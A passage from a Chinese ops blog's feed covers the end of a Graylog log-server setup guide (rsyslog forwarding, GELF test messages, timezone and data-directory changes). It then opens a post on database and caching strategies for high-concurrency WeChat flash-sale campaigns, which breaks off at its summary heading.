&lt;h4 id=&quot;配置其他服务器给Graylog服务器发送syslog&quot;&gt;&lt;a href=&quot;#配置其他服务器给Graylog服务器发送syslog&quot; class=&quot;headerlink&quot; title=&quot;配置其他服务器给Graylog服务器发送syslog&quot;&gt;&lt;/a&gt;配置其他服务器给Graylog服务器发送syslog&lt;/h4&gt;&lt;p&gt;参考官网：&lt;a href=&quot;https://marketplace.graylog.org/addons/a47beb3b-0bd9-4792-a56a-33b27b567856&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;从Linux系统日志发送到Graylog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SSH登录“其他服务器”，创建rsyslog配置文件90-graylog.conf：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/rsyslog.d/90-graylog.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;添加如下代码，把 graylog_server_IP 替换为Graylog服务器ip地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$template GRAYLOGRFC5424,&amp;quot;&amp;lt;%pri%&amp;gt;%protocol-version% %timestamp:::date-rfc3339%    %HOSTNAME% %app-name% %procid% %msg%\n&amp;quot;
*.* @graylog_server_IP:8514;GRAYLOGRFC5424
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启rsyslog服务使生效：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/rsyslog restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置完成之后，回到Graylog Web，点击Sources，查看是否有新添加rsyslog。&lt;/p&gt;
&lt;h4 id=&quot;Graylog使用http协议发送：&quot;&gt;&lt;a href=&quot;#Graylog使用http协议发送：&quot; class=&quot;headerlink&quot; title=&quot;Graylog使用http协议发送：&quot;&gt;&lt;/a&gt;Graylog使用http协议发送：&lt;/h4&gt;&lt;p&gt;添加要接收的其他服务器syslog日志：System-&amp;gt;Inputs-&amp;gt;GELF HTTP-&amp;gt;Launch new input。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后在服务器上面发送下面命令。&lt;/p&gt;
&lt;figure class=&quot;highlight scheme&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;name&quot;&gt;root@graylog-development&lt;/span&gt; ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d &#39;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;short_message&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Hello there&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;example.org&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;facility&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;_foo&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;bar&quot;&lt;/span&gt;&amp;#125;&#39;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;name&quot;&gt;root@graylog-development&lt;/span&gt; ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d &#39;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;short_message&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;测试&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;example.org&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;facility&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;_foo&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;bar&quot;&lt;/span&gt;&amp;#125;&#39;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里定义192.168.1.234 是graylog-server服务器地址 12201 端口是之前创建好的。&lt;/p&gt;
&lt;h3 id=&quot;搜素Graylog&quot;&gt;&lt;a href=&quot;#搜素Graylog&quot; class=&quot;headerlink&quot; title=&quot;搜素Graylog&quot;&gt;&lt;/a&gt;搜素Graylog&lt;/h3&gt;&lt;p&gt;假如你要搜索hello：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面安装配置了基本的Graylog服务器。&lt;/p&gt;
&lt;h3 id=&quot;时区和高亮设置&quot;&gt;&lt;a href=&quot;#时区和高亮设置&quot; class=&quot;headerlink&quot; title=&quot;时区和高亮设置&quot;&gt;&lt;/a&gt;时区和高亮设置&lt;/h3&gt;&lt;p&gt;admin帐号的时区：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/server/server.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt; root_timezone = Asia/Shanghai&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-server restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其他帐号的默认时区：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/web/web.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;18&lt;/span&gt; timezone=&lt;span class=&quot;string&quot;&gt;&quot;Asia/Shanghai&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-web restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;允许查询结果高亮：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/server/server.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;147&lt;/span&gt; allow_highlighting = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-server restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;移动数据目录&quot;&gt;&lt;a href=&quot;#移动数据目录&quot; class=&quot;headerlink&quot; title=&quot;移动数据目录&quot;&gt;&lt;/a&gt;移动数据目录&lt;/h3&gt;&lt;figure class=&quot;highlight livescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;移动elasticsearch的数据目录&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/elasticsearch stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo cp -rp /var/lib/elasticsearch/ /data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo vi /etc/sysconfig/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; DATA_DIR=/data/elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/elasticsearch start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;移动mongo的数据目录&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/mongod stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo cp -rp /var/lib/mongo /data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo vi /etc/mongod.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; dbpath=/&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt;/lib/mongo&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; dbpath=/data/mongo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mtagent@access2 ~]$ sudo /etc/init.d/mongod start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;其余参考文档&quot;&gt;&lt;a href=&quot;#其余参考文档&quot; class=&quot;headerlink&quot; title=&quot;其余参考文档&quot;&gt;&lt;/a&gt;其余参考文档&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://docs.graylog.org/en/1.3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;参考官网&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.topspeedsnail.com/archives/4066&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Centos7 搭建graylog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/fitnessefan/blog/464351?utm_source=tuicool&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Graylog——日志聚合工具中的后起之秀&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 提起日志聚合工具，有开源界的ELK，商业界的Splunk，但我要介绍开源的后起之秀Graylog，可以说是龙头老大Splunk的开源版。&lt;/p&gt;
&lt;h1 id=&quot;Graylog——日志分析平台完美代替Elasticsearch&quot;&gt;&lt;a href=&quot;#Graylog—
    
    </summary>
    
      <category term="日志分析平台" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>如何解决秒杀的性能问题和微信推广活动的讨论</title>
    <link href="http://blog.yangcvo.me/2016/11/10/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%8A%BD%E5%A5%96%E7%9A%84%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E5%92%8C%E7%A7%92%E6%9D%80%E7%9A%84%E8%AE%A8%E8%AE%BA%20%20/"/>
    <id>http://blog.yangcvo.me/2016/11/10/运维笔记/如何解决抽奖的性能问题和秒杀的讨论  /</id>
    <published>2016-11-10T08:39:28.000Z</published>
    <updated>2016-12-15T14:25:24.000Z</updated>
    
    <content type="html">&lt;p&gt;最近业务试水微信抽奖活动，公司现在打算推广下产品。增加些粉丝量 之前经常看到淘宝的同行们讨论秒杀，讨论电商，这次终于轮到我们自己理论结合实际一次了。&lt;/p&gt;
&lt;p&gt;ps：进入正文前先说一点个人感受，之前看淘宝的ppt感觉都懂了，等到自己出解决方案的时候发现还是有很多想不到的地方其实都没懂，再次验证了“细节是魔鬼”的理论。并且一个人的能力有限，只有大家一起讨论才能想的更周全，更细致。好了，闲话少说，下面进入正文。&lt;/p&gt;
&lt;h4 id=&quot;一、抽奖活动带来了什么？&quot;&gt;&lt;a href=&quot;#一、抽奖活动带来了什么？&quot; class=&quot;headerlink&quot; title=&quot;一、抽奖活动带来了什么？&quot;&gt;&lt;/a&gt;一、抽奖活动带来了什么？&lt;/h4&gt;&lt;p&gt;微信积分兑换现金或抢购抽奖活动一般会经过【关注公众号】【分享活动获得积分】【积分兑换】【抽奖安全环节】这3个大环节，而其中【抢订单】这个环节是最考验业务提供方的抗压能力的。&lt;/p&gt;
&lt;p&gt;积分兑换环节一般会带来2个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、高并发&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;　　比较火热的抽奖在线人数都是20w起的，如此之高的在线人数对于网站架构从前到后都是一种考验。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;2、抽奖人员过多&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3、 抢订单&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;　　任何商品都会有数量上限，如何避免成功下订单买到商品的人数不超过商品数量的上限，这是每个抢购活动都要面临的难题。&lt;/p&gt;
&lt;h4 id=&quot;二、如何解决？&quot;&gt;&lt;a href=&quot;#二、如何解决？&quot; class=&quot;headerlink&quot; title=&quot;二、如何解决？&quot;&gt;&lt;/a&gt;二、如何解决？&lt;/h4&gt;&lt;p&gt;首先，产品解决方案我们就不予讨论了。我们只讨论技术解决方案&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、前端&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;面对高并发的抢购活动，前端常用的三板斧是【扩容】【静态化】【限流】&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　A：扩容&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　加机器，这是最简单的方法，通过增加前端池的整体承载量来抗峰值。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　这里我们都是多台主从集群去跑。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;span class=&quot;keyword&quot;&gt;B：静态化&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　将活动页面上的所有可以静态的元素全部静态化，并尽量减少动态元素。通过CDN来抗峰值。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　这里我们都是把图片静态放在又拍云和阿里云上面。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　C：限流&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　一般都会采用&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;级别的限流，即针对某一个&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;，限制单位时间内发起请求数量。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　或者活动入口的时候增加游戏或者问题环节进行消峰操作。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　我们采用Nginx 前面做了反向代理后面优化nginx。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　D：有损服务&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　最后一招，在接近前端池承载能力的水位上限的时候，随机拒绝部分请求来保护活动整体的可用性。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2、后端&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么后端的数据库在高并发和超卖下会遇到什么问题呢？主要会有如下3个问题：（主要讨论写的问题，读的问题通过增加cache可以很容易的解决）&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;　　I：　首先MySQL自身对于高并发的处理性能就会出现问题，一般来说，MySQL的处理性能会随着并发thread上升而上升，但是到了一定的并发度之后会出现明显的拐点，之后一路下降，最终甚至会比单thread的性能还要差。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　II： 其次，超卖的根结在于减库存操作是一个事务操作，需要先&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt;，然后&lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt;，最后&lt;span class=&quot;keyword&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;。最后这个&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;操作是不能出现负数的，但是当多用户在有库存的情况下并发操作，出现负数这是无法避免的。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　III：最后，当减库存和高并发碰到一起的时候，由于操作的库存数目在同一行，就会出现争抢&lt;span class=&quot;keyword&quot;&gt;InnoDB&lt;/span&gt;行锁的问题，导致出现互相等待甚至死锁，从而大大降低MySQL的处理性能，最终导致前端页面出现超时异常。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　这个有遇到过的，就是锁表导致访问出现网络异常。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;针对上述问题，如何解决呢？ 我们先看眼淘宝的高大上解决方案：&lt;/p&gt;
&lt;figure class=&quot;highlight axapta&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;　I：  关闭死锁检测，提高并发处理性能。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　II：修改源代码，将排队提到进入引擎层前，降低引擎层面的并发度。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;　　III：组提交，降低&lt;span class=&quot;keyword&quot;&gt;server&lt;/span&gt;和引擎的交互次数，降低IO消耗。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;解决方案1：&quot;&gt;&lt;a href=&quot;#解决方案1：&quot; class=&quot;headerlink&quot; title=&quot;解决方案1：&quot;&gt;&lt;/a&gt;解决方案1：&lt;/h3&gt;&lt;p&gt;将存库从MySQL前移到Redis中，所有的写操作放到内存中，由于Redis中不存在锁故不会出现互相等待，并且由于Redis的写性能和读性能都远高于MySQL，这就解决了高并发下的性能问题。然后通过队列等异步手段，将变化的数据异步写入到DB中。&lt;/p&gt;
&lt;p&gt;优点：解决性能问题&lt;/p&gt;
&lt;p&gt;缺点：没有解决超卖问题，同时由于异步写入DB，存在某一时刻DB和Redis中数据不一致的风险。&lt;/p&gt;
&lt;h3 id=&quot;解决方案2：&quot;&gt;&lt;a href=&quot;#解决方案2：&quot; class=&quot;headerlink&quot; title=&quot;解决方案2：&quot;&gt;&lt;/a&gt;解决方案2：&lt;/h3&gt;&lt;p&gt;引入队列，然后将所有写DB操作在单队列中排队，完全串行处理。当达到库存阀值的时候就不在消费队列，并关闭购买功能。这就解决了超卖问题。&lt;/p&gt;
&lt;p&gt;优点：解决超卖问题，略微提升性能。&lt;/p&gt;
&lt;p&gt;缺点：性能受限于队列处理机处理性能和DB的写入性能中最短的那个，另外多商品同时抢购的时候需要准备多条队列。&lt;/p&gt;
&lt;h3 id=&quot;解决方案3：&quot;&gt;&lt;a href=&quot;#解决方案3：&quot; class=&quot;headerlink&quot; title=&quot;解决方案3：&quot;&gt;&lt;/a&gt;解决方案3：&lt;/h3&gt;&lt;p&gt;将写操作前移到MC中，同时利用MC的轻量级的锁机制CAS来实现减库存操作。&lt;/p&gt;
&lt;p&gt;优点：读写在内存中，操作性能快，引入轻量级锁之后可以保证同一时刻只有一个写入成功，解决减库存问题。&lt;/p&gt;
&lt;p&gt;缺点：没有实测，基于CAS的特性不知道高并发下是否会出现大量更新失败？不过加锁之后肯定对并发性能会有影响。&lt;/p&gt;
&lt;h3 id=&quot;解决方案4：&quot;&gt;&lt;a href=&quot;#解决方案4：&quot; class=&quot;headerlink&quot; title=&quot;解决方案4：&quot;&gt;&lt;/a&gt;解决方案4：&lt;/h3&gt;&lt;p&gt;将提交操作变成两段式，先申请后确认。然后利用Redis的原子自增操作（相比较MySQL的自增来说没有空洞），同时利用Redis的事务特性来发号，保证拿到小于等于库存阀值的号的人都可以成功提交订单。然后数据异步更新到DB中。&lt;/p&gt;
&lt;p&gt;优点：解决超卖问题，库存读写都在内存中，故同时解决性能问题。&lt;/p&gt;
&lt;p&gt;缺点：由于异步写入DB，可能存在数据不一致。另可能存在少买，也就是如果拿到号的人不真正下订单，可能库存减为0，但是订单数并没有达到库存阀值。&lt;/p&gt;
&lt;p&gt; 三、总结&lt;/p&gt;
